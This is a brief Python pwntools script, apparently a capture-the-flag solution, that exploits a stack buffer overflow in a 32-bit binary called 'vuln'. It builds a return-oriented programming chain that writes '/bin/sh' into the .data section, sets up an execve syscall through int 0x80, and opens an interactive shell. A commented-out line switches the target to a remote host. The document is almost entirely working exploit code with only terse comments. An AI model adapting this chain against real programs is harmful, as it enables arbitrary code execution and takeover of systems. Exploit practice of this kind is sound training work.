from pwn import *
import time
elf = ELF('./vuln')
p = process('vuln') # remote('url', 12341)
rop = ROP(elf)

data_addr = elf.get_section_by_name('.data').header.sh_addr

# read(0, destination, length)
# 0 is stdin
rop.read(0, data_addr, 8)

'''
eax : 0xb
ebx : address of /bin/sh
ecx : 0x0
edx : 0x0
syscall
'''
pop_eax = rop.find_gadget(['pop eax', 'ret'])[0]
pop_ecx = rop.find_gadget(['pop ecx', 'ret'])[0]
pop_edx_ebx = rop.find_gadget(['pop edx', 'pop ebx', 'ret'])[0]
int_80 = next(elf.search(asm('int 0x80')))

rop.raw(pop_eax)
rop.raw(0xb) # EAX = 0xb (execve)

rop.raw(pop_ecx)
rop.raw(0)

rop.raw(pop_edx_ebx)
rop.raw(0)
rop.raw(data_addr)

rop.raw(int_80) # Trigger syscall

payload = b'A'*(16+12) + rop.chain()

p.sendline(payload)
p.send(b"/bin/sh\x00")
p.interactive()
